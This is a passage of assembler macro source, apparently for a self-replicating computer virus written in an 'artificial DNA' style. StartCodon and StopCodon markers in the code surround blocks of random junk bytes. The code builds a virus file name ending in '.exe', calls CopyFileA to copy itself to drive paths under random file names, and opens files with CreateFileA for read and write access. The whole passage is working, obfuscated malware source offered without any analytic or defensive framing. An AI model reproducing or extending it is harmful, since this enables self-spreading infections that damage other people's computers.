    BigNum=virusname-DataOffset
    AlreadyStarted=0
db StopCodon
db 78
db 67
db 10
db 234
db 11
db 185
db 37
db 57
db 8
db 175
db 210
db 92
db 57
db 228
db 163
db 216
db 101
db 11
db 206
db 54
db 148
db 52
db 80
db 216
db 120
db 156
db 156
db 215
db 232
db 21
db 39
db 188
db 245
db 83
db 45
db 242
db 65
db 248
db 28
db 72
db 90
db 94
db 214
db 199
db 43
db 165
db 224
db 97
db 75
db 120
db 191
db 12
db 46
db 229
db 252
db 142
db 194
db 24
db 239
db 243
db 66
db 55
db 245
db 83
db 81
db 98
db 85
db 50
db 222
db 19
db 27
db 248
db 160
db 231
db 239
db 109
db 39
db 78
db 74
db 182
db 77
db 19
db 224
db 46
db 2
db 120
db 183
db 19
db 207
db 195
db 236
db 151
db 178
db 116
db 16
db 220
db 241
db 76
db 187
db 211
db 183
db 187
db 67
db 153
db 6
db 226
db 167
db 200
db 212
db 229
db 4
db 35
db 121
db 70
db 109
db 19
db 117
db 37
db 180
db 42
db 122
db 23
db 205
db 250
db 92
db 64
db 92
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 56
db 122
db 13
db 199
db 110
db 5
db 59
db 255
db 92
db 142
db 126
db 31
db 83
db 62
db 44
db 133
db 79
db 83
db 192
db 172
db 213
db 86
db 223
db 11
db 244
db 176
db 110
db 105
db 210
db 150
db 242
db 197
db 119
db 172
db 115
db 203
db 55
db 34
db 101
db 30
db 61
db 86
db 247
db 64
db 119
db 97
db 178
db 155
db 21
db 184
db 171
db 242
db 238
db 183
db 83
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='evol'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 249
db 147
db 199
db 102
db 65
db 202
db 28
db 240
db 24
db 17
db 153
db 179
db 155
db 202
db 182
db 69
db 91
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
    _getDO
    BigNum=virusname+4-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 194
db 97
db 58
db 113
db 94
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='usss'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord                  ; Construct virusfilename
db StopCodon
db 236
db 105
db 245
db 85
db 28
db 102
db 251
db 206
db 251
db 250
db 162
db 89
db 166
db 231
db 15
db 180
db 123
db 139
db 59
db 80
db 116
db 247
db 162
db 248
db 120
db 55
db 227
db 51
db 81
db 212
db 71
db 41
db 55
db 183
db 177
db 30
db StartCodon
    _getDO
db StopCodon
db 215
db 31
db 39
db StartCodon
    BigNum=virext-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 40
db 203
db 36
db 248
db 113
db 103
db 162
db 140
db 226
db 222
db 157
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum='.exe'
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 26
db 34
db 103
db 248
db 215
db 30
db 235
db 85
db 154
db 141
db 204
db 38
db 69
db 146
db 38
db 102
db 252
db 48
db 127
db 139
db 106
db 72
db 202
db 158
db 23
db 187
db 181
db 241
db 120
db 192
db 242
db 18
db 69
db 83
db 155
db 80
db 189
db 54
db 241
db 177
db 150
db 237
db 53
db 129
db 198
db 127
db 85
db 193
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord                  ; create extention
       _nopsA
       _push                       ; Save pointer to filename buffer
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _push
    _getDO
_nopREAL
    BigNum=Driveletter3-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
       _nopsA
db StopCodon
db 49
db 90
db 87
db 85
db 208
db 179
db 245
db 172
db StartCodon
       _push
    _getDO
    BigNum=hCopyFileA-DataOffset
    AlreadyStarted=0
    if BigNum<25
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 67
db 149
db 85
db 238
db 0
db 169
db 18
db 248
db 234
db 9
db 73
db 245
db 241
db 96
db 44
db 76
db 43
db 223
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
       _pop
       _nopdA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _push
    _getDO
    BigNum=RandomFileName-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
       _nopsA
       _push
    _getDO
    BigNum=hCopyFileA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 255
db 248
db 84
db 96
db 89
db 217
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 43
db 61
db 1
db 103
db 71
db 35
db 126
db 12
db 209
db 23
db 116
db 126
db 153
db 72
db 31
db 170
db 167
db 71
db 4
db 31
db 0
db 250
db 96
db 166
db 236
db 23
db 95
db 136
db 132
db 57
db 86
db 116
db 22
db 27
db 85
db 109
db 98
db 186
db 10
db 183
db 255
db 225
db 37
db 250
db 11
db 81
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _push
db StopCodon
db 233
db 98
db 234
db 23
db 62
db 156
db 104
db 122
db 229
db 186
db 28
db 226
db 195
db 88
db 77
db 207
db 200
db 166
db 249
db 80
db 158
db 132
db 79
db 207
db 138
db 48
db 233
db 188
db 92
db 12
db 180
db 44
db 248
db 107
db 153
db 43
db 91
db 160
db 27
db 3
db 27
db 12
db 233
db 204
db 104
db 202
db 161
db 219
db 0
db 14
db 254
db 219
db 48
db 131
db 30
db 1
db 80
db 85
db 111
db StartCodon
       _push
    BigNum=3
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 230
db 248
db 157
db 110
db 251
db 55
db 77
db 74
db 129
db 169
db 243
db 61
db 63
db 238
db 115
db 202
db 70
db 227
db 188
db 245
db 17
db 146
db 234
db 10
db 129
db 31
db 189
db 179
db 44
db 35
db 209
db 168
db 93
db 231
db 126
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _push
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 73
db 109
db 129
db 245
db 167
db 197
db 75
db 120
db 242
db 141
db 67
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 151
db 139
db 238
db 169
db 20
db 102
db 144
db 250
db 169
db 100
db 5
db 102
db 121
db 68
db 139
db 48
db 1
db 113
db 187
db 184
db 201
db 244
db 84
db 97
db 115
db 131
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
       _sub0001
    BigNum=0xC0000000
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
db StopCodon
db 253
db 67
db 202
db 201
db 58
db 155
db 45
db 243
db 128
db 120
db 242
db 118
db 6
db 227
db 165
db 129
db 61
db 154
db 120
db 62
db 136
db 4
db 156
db 2
db 155
db 133
db 192
db 115
db 58
db 183
db StartCodon
    _getDO
db StopCodon
db 216
db 233
db 131
db 21
db 238
db 227
db 81
db 106
db 46
db 65
db 95
db 192
db 81
db 110
db 107
db StartCodon
    BigNum=RandomFileName-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 24
db 219
db 251
db 62
db 196
db 32
db 118
db 172
db 198
db 51
db 69
db 106
db 109
db 53
db 111
db 160
db 159
db 203
db 25
db 39
db 195
db 43
db 52
db 69
db 146
db 75
db 245
db 62
db 38
db 27
db 220
db 28
db 30
db 183
db 96
db 163
db 237
db 15
db 220
db 68
db 76
db 28
db 125
db 42
db 177
db 197
db 171
db 8
db 35
db 162
db 147
db 131
db 30
db 249
db 221
db 99
db 131
db 40
db 31
db 31
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
    _getDO
    BigNum=hCreateFileA-DataOffset
    AlreadyStarted=0
db StopCodon
db 198
db 156
db 76
db 189
db 123
db 10
db 188
db 140
db 22
db 128
db 34
db 147
db 105
db 168
db 0
db 116
db 254
db 74
db 252
db 203
db 32
db 70
db 182
db 234
db 25
db 82
db 251
db 50
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 220
db 64
db 76
db 185
db 249
db 238
db 29
db 145
db 130
db 170
db 99
db 200
db 201
db 142
db 22
db 150
db 168
db 8
db 245
db 194
db 207
db 4
db 176
db 12
db 35
db 56
db 255
db 76
db 163
db 97
db 76
db 23
db 78
db 41
db 54
db 243
db 190
db 104
db 10
db 217
db 108
db 0
db 237
db 74
db 137
db 149
db 80
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 33
db 183
db 145
db 164
db 159
db 215
db 41
db 47
db 47
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=FileHandle-DataOffset
    AlreadyStarted=0
db StopCodon
db 162
db 164
db 92
db 210
db 245
db 89
db StartCodon
    if BigNum<25
db StopCodon
db 145
db 244
db 19
db 178
db 241
db 48
db 246
db 225
db 175
db 248
db 42
db 205
db 7
db 72
db 141
db 209
db 73
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 58
db 49
db 58
db 78
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopsA
db StopCodon
db 39
db StartCodon
       _writeDWord              ; mov dword[FileHandle], RegA
       _save
    _getDO
db StopCodon
db 1
db 240
db 146
db 234
db 172
db 12
db 173
db 147
db 211
db 87
db 22
db 10
db 75
db 232
db 179
db 196
db 162
db 167
db 110
db 89
db 233
db 208
db 51
db 149
db 220
db 121
db 254
db 138
db 90
db 66
db 103
db 101
db 234
db 253
db 30
db 201
db 184
db 56
db 246
db 16
db 112
db 253
db 238
db 226
db 108
db 174
db 53
db 253
db 79
db 249
db 37
db 61
db 168
db StartCodon
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
